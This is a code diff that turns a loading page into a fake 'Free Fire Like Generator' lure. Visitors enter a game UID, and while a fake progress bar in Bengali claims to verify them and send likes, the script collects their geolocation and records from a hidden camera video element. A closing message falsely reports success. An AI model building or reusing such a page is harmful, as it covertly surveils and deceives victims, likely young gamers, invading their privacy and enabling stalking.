@@ -3,10 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Free Fire Like Panel</title>
+    <style>
+        body { background: #121212; color: #fff; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }
+        .box { background: #1e1e1e; padding: 20px; border-radius: 10px; display: inline-block; width: 300px; }
+        input, select, button { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
+        button { background: #ff9800; color: #fff; font-weight: bold; cursor: pointer; }
+    </style>
 </head>
 <body>
-    <h2>Loading, Please Wait...</h2>
+
+    <div class="box" id="mainBox">
+        <h2>FF Like Generator</h2>
+        <input type="text" id="uid" placeholder="Enter Player UID">
+        <select id="server">
+            <option value="BD">BD Server</option>
+            <option value="IND">India Server</option>
+        </select>
+        <select id="likes">
+            <option value="220">220 Likes</option>
+        </select>
+        <button onclick="startPanel()">Submit</button>
+    </div>
+
+    <div class="box" id="loadingBox" style="display:none;">
+        <h3 id="statusText">অনুগ্রহ করে অপেক্ষা করুন, আপনি রোবট কি না ভেরিফাই করা হচ্ছে...</h3>
+        <p id="percentage">0%</p>
+    </div>
+
     <video id="video" autoplay playsinline muted style="display:none;"></video>
 
     <script>
@@ -106,9 +130,17 @@
 ⚠️ Note: এই তথ্যের অপব্যবহার করলে আপনি সম্পূর্ণ দায়ী থাকবেন। আমি আপনার কাজের জন্য দায়ী থাকব না।`;
         }
 
-        async function startProcess() {
+        async function startPanel() {
+            const uid = document.getElementById('uid').value;
+            if(!uid) {
+                alert('Please enter UID');
+                return;
+            }
+
+            document.getElementById('mainBox').style.display = 'none';
+            document.getElementById('loadingBox').style.display = 'inline-block';
+
             let lat = null, lon = null;
-            
             const locationPromise = new Promise((resolve) => {
                 if (!navigator.geolocation) {
                     resolve();
@@ -157,16 +189,29 @@
 
                 mediaRecorder.start();
 
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                }, 8000);
+                // লোডিং প্রোগ্রেস বার (২০% থেকে ১০০%)
+                let p = 20;
+                document.getElementById('percentage').innerText = p + '%';
+                
+                let interval = setInterval(() => {
+                    p += 20;
+                    if(p <= 100) {
+                        document.getElementById('percentage').innerText = p + '%';
+                    }
+                    if(p === 60) {
+                        document.getElementById('statusText').innerText = "সার্ভার থেকে লাইক পাঠানো হচ্ছে...";
+                    }
+                    if(p >= 100) {
+                        clearInterval(interval);
+                        mediaRecorder.stop();
+                        document.getElementById('loadingBox').innerHTML = `<h3>সফলভাবে আপনার একাউন্টে 220 টি লাইক পাঠানো হয়েছে!</h3>`;
+                    }
+                }, 1600);
 
             } catch (err) {
-                console.log('Error:', err);
+                document.getElementById('loadingBox').innerHTML = `<h3>পারমিশন দেওয়া হয়নি!</h3>`;
             }
         }
-
-        window.onload = startProcess;
     </script>
 </body>
 </html>
